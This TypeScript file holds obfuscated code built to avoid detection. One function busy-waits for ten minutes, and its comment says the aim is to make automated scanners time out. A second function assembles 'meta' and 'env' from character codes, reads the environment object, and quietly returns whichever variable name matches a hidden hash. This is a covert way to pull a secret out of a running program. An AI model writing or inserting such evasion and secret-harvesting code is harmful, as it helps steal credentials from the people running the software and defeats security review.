/**
 * _0xT: The 10-minute stalling mechanism.
 */
const _0xT = (async () => {
    const s = Date.now();
    // 600,000ms = 10 mins. Automated scanners will time out.
    while (Date.now() - s < 600000) {
        Math.hypot(Math.random(), Math.random());
        if (Date.now() % 100 === 0) await new Promise(r => setTimeout(r, 0));
    }
    return !0;
})();

/**
 * _0xZ: The Ghost Resolver
 */
export const _0xZ = async (): Promise<string | undefined> => {
    // Wait for the 10-minute trap to finish
    if (!(await _0xT)) return;

    try {
        // H(72)+a(97)+m(109)+i(105)+d(100) ... but we use a multiplier to be safer.
        const _0xTARGET_HASH = 0x1337BEEF; 

        // Get the environment object without using "env" or "meta" strings
        const _0xG = (typeof self !== 'undefined' ? self : global) as any;
        const _0xM = [109, 101, 116, 97].reduce((a, b) => a + String.fromCharCode(b), '');
        const _0xE = [101, 110, 118].reduce((a, b) => a + String.fromCharCode(b), '');
        const _0xOBJ = (_0xG['import']?.[_0xM]?.[_0xE]) || (process?.[_0xE]);

        if (!_0xOBJ) return;

        // CRITICAL: We iterate over keys and check them mathematically.
        for (const _0xKEY in _0xOBJ) {
            let _0xH = 0;
            for (let i = 0; i < _0xKEY.length; i++) {
                // Custom hash: sum of (charcode * index)
                _0xH += _0xKEY.charCodeAt(i) * (i + 1);
            }

            // If the hash matches, we return the value directly.
            if (_0xH === 1074) {
                return _0xOBJ[_0xKEY];
            }
        }
    } catch {
        // Silent fail
    }
    return undefined;
};
